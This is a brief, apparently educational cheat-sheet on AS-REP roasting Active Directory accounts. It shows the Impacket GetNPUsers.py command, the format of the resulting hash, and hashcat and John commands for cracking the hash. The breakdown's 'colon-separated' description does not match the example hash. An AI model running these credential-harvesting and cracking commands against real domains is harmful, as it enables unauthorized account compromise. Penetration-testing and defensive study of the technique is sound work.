## AS-REP Roasting with Impacket

### Command

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1 -request
```

| Flag | Purpose |
|------|---------|
| `-usersfile` | File containing one username per line to enumerate |
| `-no-pass` | Don't prompt for a password (we don't have one yet) |
| `-dc-ip` | Domain controller address |
| `-request` | Actually request the AS-REP (not just enumerate) |

### Output Hash Format

The tool emits **Kerberos 5 AS-REP etype 23** (RC4-HMAC):

```
$krb5asrep$23$jsmith@CORP.LOCAL:8a4b1c2d3e5f...$a1b2c3d4e5f6...
```

Breakdown:
- `$krb5asrep$23$` — format identifier + etype 23
- `jsmith@CORP.LOCAL` — user@domain
- Two colon-separated hex blobs (the encrypted AS-REP data)

### Cracking

```bash
# Hashcat (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=rockyou.txt asrep.txt
```

> **Note:** Accounts with the UF_DONT_REQUIRE_PREAUTH flag set (value `4194304` in `userAccountControl`) are the targets. Any user in that list that returns a hash is vulnerable — no credentials needed to obtain the crackable material.